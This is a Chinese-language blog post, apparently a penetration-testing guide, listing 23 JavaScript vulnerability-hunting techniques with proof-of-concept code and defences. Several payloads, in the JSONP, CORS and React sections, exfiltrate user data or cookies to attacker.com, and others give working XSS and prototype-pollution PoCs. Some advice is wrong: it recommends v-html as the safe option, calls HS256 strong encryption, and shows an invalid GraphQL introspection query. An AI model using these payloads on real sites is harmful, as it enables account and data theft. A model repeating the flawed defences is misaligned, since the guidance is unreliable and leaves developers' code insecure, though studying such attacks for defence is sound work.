#  CVE编号在招手！23个JS漏洞挖掘技巧！   
原创 牛叫瘦  HACK之道   2025-04-17 00:03  
  
   
  
随着Web应用与Node.js的爆发式增长，JavaScript已成为现代数字生态的核心语言，其安全边界直接关系着数十亿用户的数据安全。XSS跨站脚本、原型链污染、SSRF服务端请求伪造等漏洞的持续涌现，不断暴露着动态语言特性与复杂依赖带来的安全隐患。攻击者利用JS弱类型、原型继承等特性构造的混淆攻击载荷，使得传统静态分析工具频频失效，而npm生态中层层嵌套的第三方依赖更形成了难以追溯的攻击链。本文基于渗透测试实战经验，系统梳理23个JS漏洞挖掘技巧，仅供参考。  
### 1、对象属性污染攻击  
  
**漏洞原理**  
：通过控制__proto__  
属性修改原型链  
```
// 攻击示例
constmerge = (target, source) => {
    for (let key in source) {
        target[key] = source[key];
    }
}
let obj = {}
merge(obj, JSON.parse('{"__proto__":{"isAdmin":true}}'))
console.log({}.isAdmin) // true
```  
  
**复现步骤**  
：  
1. 1. 定位对象合并函数  
  
1. 2. 构造包含__proto__  
属性的JSON输入  
  
1. 3. 验证原型链污染效果  
  
**防御方案**  
：  
- • 使用Object.create(null)  
创建无原型对象  
  
- • 过滤__proto__  
等特殊属性  
  
### 2、构造函数污染  
  
**攻击向量**  
：  
```
functionUser() {}
const payload = {
    constructor: {
        prototype: {
            isAdmin: true
        }
    }
}
Object.assign(User.prototype, payload)
```  
  
**检测方法**  
：  
- • 监控关键构造函数原型变化  
  
- • 使用Object.freeze()  
冻结重要原型  
  
### 3、DOM型XSS全路径追踪  
  
**漏洞代码特征**  
：  
```
document.write(location.hash.slice(1))
```  
  
**PoC构造**  
：  
```
https://vuln-site.com#<img src=x onerror=alert(1)>
```  
  
**调试技巧**  
：  
- • 使用monitorEvents(document)  
监听DOM事件  
  
- • Chrome DevTools设置DOM断点  
  
### 4、动态脚本注入检测  
  
**高危模式识别**  
：  
```
const script = document.createElement('script')
script.src = userControlledURL
document.body.appendChild(script)
```  
  
**攻击验证**  
：  
1. 1. 控制userControlledURL参数  
  
1. 2. 注入恶意脚本路径  
  
1. 3. 观察脚本加载行为  
  
**防御策略**  
：  
- • 实施严格的URL白名单机制  
  
- • 添加nonce  
属性验证  
  
### 5、localStorage密钥硬编码  
  
**检测流程**  
：  
1. 1. 打开Chrome开发者工具-Application面板  
  
1. 2. 检查localStorage存储内容  
  
1. 3. 查找API密钥、会话令牌等敏感数据  
  
**典型案例**  
：  
```
localStorage.setItem('apiKey', 'sk_live_1234567890abcdef')
```  
### 6、postMessage跨域泄露  
  
**漏洞验证代码**  
：  
```
window.addEventListener('message', (e) => {
    // 未验证来源直接处理
    document.getElementById('data').innerHTML = e.data
})
```  
  
**攻击利用**  
：  
```
<iframesrc="https://target-site.com">
<script>  const iframe = document.querySelector('iframe')  iframe.contentWindow.postMessage('恶意内容', '*')</script>
```  
  
**安全加固**  
：  
- • 严格验证event.origin  
  
- • 限制消息处理范围  
  
### 7、JSONP劫持检测  
  
**特征识别**  
：  
```
callback = request.query.callback
response.send(`${callback}(${data})`)
```  
  
**漏洞利用**  
：  
```
<script>functionstealData(data) {    fetch('https://attacker.com?data='+btoa(JSON.stringify(data)))}</script>
<scriptsrc="https://api.vuln.com/userinfo?callback=stealData"></script>
```  
  
**防护方案**  
：  
- • 弃用JSONP改用CORS  
  
- • 添加CSRF Token验证  
  
### 8、 JWT客户端篡改  
  
**攻击流程**  
：  
1. 1. 从localStorage获取JWT  
  
1. 2. 使用Base64解码payload段  
  
1. 3. 修改用户角色声明：  
  
```
// 原始payload
{"user":"guest","role":"user"}

// 修改后
{"user":"admin","role":"admin"}
```  
1. 4. 重新签名发送请求  
  
**防御措施**  
：  
- • 服务端严格校验签名  
  
- • 使用HS256强加密算法  
  
### 9、 GraphQL 内省查询泄露  
  
**漏洞原理**  
：未禁用内省查询导致接口结构泄露  
```
// 恶意查询示例
POST /graphql
{
  "__schema": {
    "types": {
      "name": true
    }
  }
}
```  
  
**复现步骤**  
：  
1. 1. 发送内省查询获取API结构  
  
1. 2. 分析返回的schema信息  
  
1. 3. 构造针对性攻击请求  
  
**防御方案**  
：  
- • 生产环境禁用内省功能  
  
- • 实施查询复杂度限制  
  
### 10、 CORS 配置不当  
  
**错误配置示例**  
：  
```
app.use(cors({
  origin: '*'// 危险配置
}))
```  
  
**攻击利用**  
：  
```
<script>fetch('https://api.target.com/user', {credentials: 'include'})  .then(res => res.text())  .then(data => location='https://attacker.com/?data='+btoa(data))</script>
```  
  
**安全加固**  
：  
- • 动态验证Origin请求头  
  
- • 设置Access-Control-Allow-Credentials: false  
  
### 11、Vue.js XSS绕过  
  
**漏洞场景**  
：  
```
// 错误用法
newVue({
  el: '#app',
  template: `<div>${userInput}</div>`// 未转译
})
```  
  
**PoC构造**  
：  
```
userInput = '{{constructor.constructor("alert(1)")()}}'
```  
  
**防御方案**  
：  
- • 始终使用v-html  
指令替代模板插值  
  
- • 启用CSP策略  
  
### 12、 React dangerouslySetInnerHTML滥用  
  
**危险代码**  
：  
```
functionMarkdownPreview({ content }) {
  return<divdangerouslySetInnerHTML={{__html:content }} />;
}
```  
  
**攻击向量**  
：  
```
content = '<img src=x onerror="fetch(\'/profile\').then(r=>r.text()).then(d=>location=\'https://attacker.com?data=\'+btoa(d))">'
```  
  
**修复建议**  
：  
- • 使用DOMPurify库过滤内容  
  
- • 实施白名单标签策略  
  
### 13、 jQuery $.html() 注入漏洞  
  
**高危代码**  
：  
```
$('#container').html(userControlledData)
```  
  
**漏洞利用**  
：  
```
userControlledData = '<script>stealCookies()</script>'
```  
  
**防御措施**  
：  
- • 改用.text()  
方法处理内容  
  
- • 升级到3.5.0+版本（修复XSS）  
  
### 14、 Lodash原型污染(CVE-2019-10744)  
  
**漏洞复现**  
：  
```
const merge = require('lodash.merge')
const payload = JSON.parse('{"__proto__":{"polluted":true}}')
merge({}, payload)
console.log({}.polluted) // true
```  
  
**修复方案**  
：  
- • 升级到4.17.12+版本  
  
- • 使用Object.hasOwnProperty  
检查  
  
### 15、WebSocket 未加密通信  
  
**风险代码**  
：  
```
const ws = newWebSocket('ws://example.com/chat') // 未使用wss
```  
  
**中间人攻击**  
：  
1. 1. 使用工具拦截WebSocket通信  
  
1. 2. 修改传输中的消息内容  
  
1. 3. 注入恶意控制指令  
  
**安全加固**  
：  
- • 强制使用wss协议  
  
- • 实施消息签名验证  
  
### 16、Service Worker 劫持  
  
**攻击流程**  
：  
```
// 恶意注册Service Worker
if ('serviceWorker'in navigator) {
  navigator.serviceWorker.register('/malicious-sw.js')
    .then(() =>console.log('SW registered'))
}
```  
  
**防御方案**  
：  
- • 设置Service-Worker-Allowed  
头限制路径  
  
- • 监控Service Worker注册行为  
  
### 17、客户端密码硬编码  
  
**错误示例**  
：  
```
constAPI_KEY = 'A3F8D9B7C2E4F6A9'// 前端暴露密钥
```  
  
**检测方法**  
：  
- • 使用Chrome DevTools全局搜索关键词  
  
- • 检查JS文件中的加密字符串  
  
### 18、 CryptoJS弱加密配置  
  
**不安全用法**  
：  
```
const encrypted = CryptoJS.AES.encrypt(data, 'secret123', {
  mode: CryptoJS.mode.ECB// 不安全模式
})
```  
  
**安全建议**  
：  
- • 使用CBC模式并配置随机IV  
  
- • 密钥长度至少256位  
  
### 19、 WebRTC IP泄露  
  
**漏洞验证**  
：  
```
const pc = newRTCPeerConnection()
pc.createDataChannel('')
pc.createOffer().then(offer => pc.setLocalDescription(offer))
pc.onicecandidate = e => {
  console.log(e.candidate.address) // 泄露内网IP
}
```  
  
**防护方案**  
：  
- • 使用代理服务器  
  
- • 配置ICE限制策略  
  
### 20、IndexedDB 越权访问  
  
**攻击演示**  
：  
```
const request = indexedDB.open('UserDB', 1)
request.onsuccess = (e) => {
  const db = e.target.result
  const tx = db.transaction('users')
  const store = tx.objectStore('users')
  store.getAll().onsuccess = e =>sendToAttacker(e.target.result)
}
```  
  
**防御措施**  
：  
- • 实施同源策略检查  
  
- • 加密敏感字段  
  
### 21、 sessionStorage跨标签页泄露  
  
**攻击场景**  
：  
```
// 标签页A
sessionStorage.setItem('token', 'secret123')

// 恶意标签页B通过opener访问
window.opener.sessionStorage.getItem('token')
```  
  
**防御方案**  
：  
- • 避免在sessionStorage存储敏感信息  
  
- • 设置rel="noopener"  
  
### 22、 Cache API投毒攻击  
  
**攻击流程**  
：  
```
caches.open('v1').then(cache => {
  cache.put(newRequest('/api/data'), 
    newResponse('恶意数据', {headers: {'Content-Type':'text/json'}})
})
```  
  
**安全建议**  
：  
- • 验证Service Worker更新完整性  
  
- • 禁用不可信来源的缓存  
  
### 23、 Cordova插件配置错误  
  
**漏洞示例**  
：  
```
<!-- config.xml 危险配置 -->
<allow-navigationhref="*"/>
<accessorigin="*"/>
```  
  
**风险验证**  
：  
1. 1. 分析移动端WebView配置  
  
1. 2. 尝试通过file://协议访问本地文件  
  
**修复方案**  
：  
- • 最小化白名单范围  
  
- • 禁用混合内容加载  
  
## 自动化漏洞挖掘  
### AST注入检测  
  
**技术原理**  
：  
```
// 检测eval参数是否可控
const esprima = require('esprima')
const code = fs.readFileSync('target.js')
const ast = esprima.parseScript(code)

walk(ast, node => {
  if (node.type === 'CallExpression' && node.callee.name === 'eval') {
    console.log('发现eval调用:', node.loc.start)
  }
})
```  
  
**实施步骤**  
：  
1. 1. 构建抽象语法树  
  
1. 2. 识别危险函数调用  
  
1. 3. 跟踪参数来源  
  
### Fuzzing测试框架  
  
**配置示例**  
：  
```
const fuzz = require('js-fuzz')
fuzz.test('XSS检测', (data) => {
  const div = document.createElement('div')
  div.innerHTML = data
  return !document.querySelector('script')
}, {
  check: (result) => result === true
})
```  
  
**执行策略**  
：  
- • 生成包含<svg/onload=>等payload  
  
- • 监控DOM变化  
  
**防御体系全景图**  
1. 1. **开发阶段**  
：  
  
1. • 启用严格模式('use strict'  
)  
  
1. • 配置ESLint安全规则集  
  
1. • 使用Safe-Eval替代eval  
  
1. 2. **构建阶段**  
：  
  
1. • 集成Snyk漏洞扫描  
  
1. • 实施代码签名验证  
  
1. • 移除调试代码  
  
1. 3. **部署阶段**  
：  
  
1. • 部署CSP策略（至少配置script-src）  
  
1. • 设置X-Content-Type-Options: nosniff  
  
1. • 启用Subresource Integrity  
  
1. 4. **监控阶段**  
：  
  
1. • 部署前端异常监控（Sentry/BugSnag）  
  
1. • 实时检测原型链污染  
  
1. • 定期进行第三方库审计  
  
JavaScript漏洞挖掘需要结合静态代码分析、动态行为监控和协议级渗透测试。  
  
   
  
  
